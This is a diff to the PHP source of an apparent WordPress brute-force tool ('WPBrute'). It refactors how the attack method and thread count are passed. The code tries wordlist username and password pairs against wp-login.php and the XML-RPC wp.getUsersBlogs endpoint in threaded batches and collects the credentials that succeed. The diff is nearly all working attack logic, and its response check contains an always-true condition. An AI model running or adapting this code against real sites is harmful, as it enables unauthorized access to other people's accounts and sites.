@@ -2,14 +2,13 @@
 
 class WPBrute {
 
-    var $url, $method;
+    var $url;
 
-    function __construct($url, $method) {
-        $this->method = $method;
+    function __construct($url) {
         $this->url = $url;
     }
 
-    function brute() {
+    function brute($method) {
         if( Config::get('protected') ) {
             msg("[+] Checking if the site is bruteproof");
             if( $protector = $this->isProtected() ) {
@@ -23,15 +22,17 @@ class WPBrute {
         if(!$usernames) return false;
         $passwords = $this->getList('bfwordlist');
         if(!$passwords) return false;
-        print "[!] how many threads to use? [default = 10] ";
-        $answer = trim(fgets(STDIN));
-        $threads = ctype_digit($answer) ? $answer : 10;
+        if( Config::get('thread') ) {
+            $threads = Config::get('thread');
+        } else {
+            $threads = 10;
+        }
         $chunks = array_chunk($passwords, $threads);
         foreach ($usernames as $username) {
             foreach ($chunks as $passwordsChunk) {
                 foreach ($passwordsChunk as $i => $password) {
-                    $urls[] = $this->url.'/'.$this->method.'.php';
-                    if($this->method == 'wp-login') {
+                    $urls[] = $this->url.'/'.$method.'.php';
+                    if($method == 'wp-login') {
                         $datas[] = ['log='.urlencode($username).'&pwd='.urlencode($password).'&wp-submit=Log+In&testcookie=1', ['Content-type: application/x-www-form-urlencoded','Cookie: wordpress_test_cookie=WP+Cookie+check']];
                     } else {
                         $post = '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'.$username.'</value></param><param><value>'.$password.'</value></param></params></methodCall>';
@@ -42,7 +43,7 @@ class WPBrute {
                 foreach ($responses as $key => $resp) {
                     preg_match('#HTTP/\d+\.\d+ (\d)#', $resp, $match);
                     if($match[1] != 4 || $match[1] != 5) {
-                        if($this->method == 'wp-login') {
+                        if($method == 'wp-login') {
                             if(stripos($resp, 'httponly') !== false) {
                                 $creds[] = [$username, $passwordsChunk[$key]];
                             }
@@ -79,7 +80,7 @@ class WPBrute {
                 $array = file(Config::get($type), FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
             }
         }
-        if(!empty($array)) {
+        if( !empty($array) ) {
             msg("[+] ".count($array)." ".$str."list loaded");
             return $array;
         } else {
